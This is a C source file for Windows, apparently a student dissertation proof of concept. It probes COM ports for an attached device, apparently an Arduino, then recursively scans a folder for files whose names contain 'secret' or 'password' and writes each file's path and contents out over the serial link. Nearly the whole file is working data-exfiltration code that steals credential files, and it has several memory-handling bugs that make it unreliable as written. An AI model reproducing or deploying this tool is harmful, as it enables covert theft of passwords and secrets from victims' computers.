#include <windows.h>
#include <stdio.h>
#include <stdbool.h>
#include <time.h>
#include <dirent.h>

// Global variables
const int numberOfKeywords = 2;
const char* const keywords[] = { "secret", "password" };

// Function declarations
bool isInteresting(char* fileName);
void scanFilesystem(char* basePath, BOOL status, HANDLE comm);
void delay(int milliseconds);

int main() {
	for (int i = 0; i < 256; i++) { // Test from COM0 to COM255 as don't which port will be plugged into
		// Convert the portname from string into required type
		char* portName[7];
		strcpy(portName, "COM");
		char sI[3];
		sprintf(sI, "%i", i);
		strcat(portName, sI);
		wchar_t convertedPortName[7];
		mbstowcs(convertedPortName, portName, 7);

		HANDLE hComm = CreateFile(convertedPortName,	// port name
			GENERIC_WRITE,								// Write
			0,											// No Sharing
			NULL,										// No Security
			OPEN_EXISTING,								// Open existing port only
			0,											// Non Overlapped I/O
			NULL);

		// Available COM port 
		if (hComm != INVALID_HANDLE_VALUE) {

			printf("Successfully opened port: ");
			printf(portName);
			printf(" - Starting to send data!");

			DCB dcbSerialParams = { 0 }; // Initializing DCB structure
			dcbSerialParams.DCBlength = sizeof(dcbSerialParams);

			BOOL Status = TRUE;
			Status = GetCommState(hComm, &dcbSerialParams);
			if (Status == FALSE) {
				printf("\n    Error! in GetCommState()");
				return Status;
			}

			dcbSerialParams.BaudRate = CBR_115200;  // Setting BaudRate = 9600
			dcbSerialParams.ByteSize = 8;           // Setting ByteSize = 8
			dcbSerialParams.StopBits = ONESTOPBIT;  // Setting StopBits = 1
			dcbSerialParams.Parity = NOPARITY;      // Setting Parity = None

			SetCommState(hComm, &dcbSerialParams);

			if (Status == FALSE) {
				printf("\n    Error! in Setting DCB Structure");
				return Status;
			}

			COMMTIMEOUTS timeouts;
			timeouts.ReadIntervalTimeout = 50;
			timeouts.ReadTotalTimeoutConstant = 50;
			timeouts.ReadTotalTimeoutMultiplier = 10;
			timeouts.WriteTotalTimeoutConstant = 50;
			timeouts.WriteTotalTimeoutMultiplier = 10;
			if (SetCommTimeouts(hComm, &timeouts) == FALSE) {
				printf("\n\n    Error! in Setting Time Outs");
				return Status;
			}

			// Loop that gives the 3 attempts to send the data
			for (int j = 0; j < 3; j++) {
				// Required delay
				delay(1500);

				// Attempt delimiter
				char* message = "<<>>";

				DWORD dNoOFBytestoWrite = strlen(message);  // No of bytes to write into the port
				DWORD dNoOfBytesWritten = 0;				// No of bytes written to the port

				Status = WriteFile(hComm,        // Handle to the Serial port
					message,                   // Data to be written to the port
					dNoOFBytestoWrite,          // No of bytes to write
					&dNoOfBytesWritten,         // Bytes written
					NULL);

				// Start searching 
				scanFilesystem("C:\\Users\\sebpa\\Documents\\University Work\\Year 4 - MSc\\Dissertation\\Example Root Dir", Status, hComm);
			}
			CloseHandle(hComm); //Closing the Serial Port
		}
		else {
			CloseHandle(hComm); // Close failed COM ports
		}
	}
	// Stop the program from exiting upon finish
	//system("pause");
	return 0;
}

/**
 * Recursively look through the directory and sub-directories
 * Get the contents ready to be sent to the Arduino
 *
 * @param basePath the path of the directory to start searching at
 */
void scanFilesystem(char* basePath, BOOL status, HANDLE comm) {
	// Allow for large file paths
	char path[1000];
	struct dirent* dp = NULL;
	DIR* dir = opendir(basePath);

	// Unable to open directory stream
	if (!dir) return;

	while ((dp = readdir(dir)) != NULL) {
		if (strcmp(dp->d_name, ".") != 0 && strcmp(dp->d_name, "..") != 0) {
			// Differentiate between file and directory
			struct stat st;
			char actualPath[sizeof(basePath)];
			strcpy(actualPath, basePath);
			strcat(actualPath, "/");
			strcat(actualPath, dp->d_name);
			stat(actualPath, &st);
			// Is a file
			if (S_ISREG(st.st_mode)) {
				// File is interesting
				if (isInteresting(dp->d_name)) {
					// Required delay
					delay(2500);

					// Open the file
					FILE* fp = fopen(actualPath, "r");

					// Get length of file
					fseek(fp, 0, SEEK_END);
					size_t lSize = ftell(fp);
					rewind(fp);

					// allocate memory for entire content, else carry on
					char* fileBuffer = calloc(1, lSize + 1);
					if (!fileBuffer) {
						fclose(fp), fputs("memory alloc fails", stderr);
						continue;
					}

					// Copy the file contents into buffer - have to do line by line for some reason or it fails if file contains more than 1 line
					size_t line = 0;
					do {
						line = fread(fileBuffer, lSize, 1, fp);
					} while (line == lSize);

					// Close the file
					fclose(fp);

					// Allocate memory for the inf to be written - filepath + contents + delimiter + null terminator, then copy it all into the buffer
					char* message = malloc(strlen(actualPath) + lSize + 2);
					strcpy(message, actualPath);
					strcat(message, "~");
					strcat(message, fileBuffer);

					// Debugging
					printf("\n");
					printf(message);
					printf("\n");

					DWORD dNoOFBytestoWrite = strlen(message);  // No of bytes to write into the port
					DWORD dNoOfBytesWritten = 0;				// No of bytes written to the port

					status = WriteFile(comm,        // Handle to the Serial port
						message,                   // Data to be written to the port
						dNoOFBytestoWrite,          // No of bytes to write
						&dNoOfBytesWritten,         // Bytes written
						NULL);

					// Free memory allocated
					free(fileBuffer);
					free(message);
				}
			}

			// Construct new path from our base path
			strcpy(path, basePath);
			strcat(path, "/");
			strcat(path, dp->d_name);

			// Recursively call again
			scanFilesystem(path, status, comm);
		}
	}
	closedir(dir);
}

/**
 * Function that decides whether a file is considered interesting based on its name.
 * If the filename contains one of the keywords as a substring it is interesting.
 *
 * @param fileName the name of the file that needs to be classified
 * @return true if the file is interesting, false otherwise
 */
bool isInteresting(char* fileName) {
	// Loop over keywords
	for (int i = 0; i < numberOfKeywords; i++) {
		// Filename contains interesting substring
		if (strstr(fileName, keywords[i]) != NULL) {
			return true;
		}
	}
	return false;
}

/**
 * Function that delays the program by a specified amount of time
 *
 * @param milliseconds number of milliseconds to delay for
 */
void delay(int milliseconds) {
	long pause;
	clock_t now, then;
	pause = milliseconds * (CLOCKS_PER_SEC / 1000);
	now = then = clock();
	while ((now - then) < pause)
		now = clock();
}